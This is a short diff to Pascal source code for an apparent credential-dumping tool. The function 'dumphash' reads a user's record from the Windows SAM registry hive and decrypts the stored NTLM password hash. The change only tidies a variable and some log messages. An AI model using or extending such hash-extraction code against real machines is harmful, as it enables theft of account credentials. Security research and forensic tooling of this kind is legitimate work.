@@ -559,7 +559,7 @@ end;
 //see https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
 function dumphash(samkey:tbyte16;rid:dword;var output:tbyte16;var username:string):boolean;
 var
-  ret:long;
+  //ret:long;
   topkey:thandle;
   cbdata,lptype:dword;
   //data:array[0..1023] of byte;
@@ -589,21 +589,20 @@ if offline=true then
 //only if run as system
 if MyRegQueryValue(HKEY_LOCAL_MACHINE, pchar('SAM\sam\Domains\account\users\'+inttohex(rid,8)),pchar('V'),data)=true then
   begin
-  log('RegCreateKeyEx OK',0);
+  log('MyRegQueryValue OK',0);
   cbdata:=length(data);
-  if (ret=0) and (cbdata>$AC) then
+  if (cbdata>$AC) then
      begin
-     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
+     log('MyRegQueryValue OK '+inttostr(cbdata)+' read',0);
      result:=_decrypthash (data,samkey ,rid,output ,username);
      end;
-
 
     exit;
 
     // DONE ???????????????????????????????????????????????
     // remove below ??
 
-  if (ret=0) and (cbdata>$AC) then
+  if (cbdata>$AC) then
      begin
      log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
      //username
